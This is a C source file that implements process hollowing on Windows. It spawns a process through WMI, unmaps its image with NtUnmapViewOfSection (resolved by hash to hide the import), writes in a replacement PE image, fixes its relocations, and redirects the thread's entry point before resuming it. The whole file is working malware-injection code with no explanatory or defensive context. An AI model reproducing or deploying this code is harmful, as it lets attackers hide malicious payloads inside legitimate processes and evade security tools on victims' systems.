#include <windows.h>
#include "pe.h"
#include "initialize_wmi.h"
#include "ph_function_defenition.h"


#pragma warning(disable : 4996)


void CreateHollowedProcess()
{
	DWORD pid = 0, tid = 0;
	INT initialized1 = wmi_initialize(_bstr_t("ROOT\\CIMV2")); 
	
	if(initialized1)
	{
		pid = CreateProcess_API(); 
		tid = get_threadID(pid);
		pSvc->Release();
		pLoc->Release();
		pCoUninitialize();
	}
	
	hProcess = OpenProcess_engine(pid); 

	pPEB = (PPEB)ReadRemotePEB();

	PLOADED_IMAGE pImage = ReadRemoteImage();

	HANDLE hThread = OpenThread_engine(tid);

	HANDLE hFile = CreateFileA_engine();

	
	if (hFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return;
	}
	
	PBYTE pBuffer = ReadFile_engine(hFile); 

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)_initialize(djb2_values[0], (LPCSTR)"NtUnmapViewOfSection",0);

	DWORD dwResult = NtUnmapViewOfSection
	(
		hProcess,
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		return;
	}

	
	PVOID pRemoteImage = VirtualAllocEx_engine(pSourceHeaders->OptionalHeader.SizeOfImage);
	
	if (!pRemoteImage)
	{
		return;
	}
	
	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
		pSourceHeaders->OptionalHeader.ImageBase;

	
	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;


	if (!WriteProcessMemory_engine(0x0, pPEB->ImageBaseAddress,pBuffer, pSourceHeaders->OptionalHeader.SizeOfHeaders,0x0))
	{
		return;
	}
	
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (!WriteProcessMemory_engine(0x0, pSectionDestination, &pBuffer[pSourceImage->Sections[x].PointerToRawData], pSourceImage->Sections[x].SizeOfRawData, 0x0))
		{
			return;
		}
	}
	

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = (char*)".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData =
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader =
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks =
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					dwBuffer = ReadProcessMemory_engine((PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress));

					dwBuffer += dwDelta;
					
					BOOL bSuccess = WriteProcessMemory_engine(0x0, (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(DWORD), 0x0);

					if (!bSuccess)
					{
						continue;
					}
				}
			}

			break;
		}

	
	DWORD dwBreakpoint = 0xCC;

	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
		pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
	
	if (!WriteProcessMemory
	(
		hProcess,
		(PVOID)dwEntrypoint,
		&dwBreakpoint,
		4,
		0
	))
	{
		return;
	}
#endif
	

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	if (!pGetThreadContext(hThread, pContext))
	{
		return;
	}

	pContext->Eax = dwEntrypoint;

	if (!pSetThreadContext(hThread, pContext))
	{
		return;
	}

	
	if (!pResumeThread(hThread)) 
	{
		return;
	}
	
	CloseHandle(hFile);
}

VOID WINAPI ph(VOID)
{
	
	CreateHollowedProcess();
	
}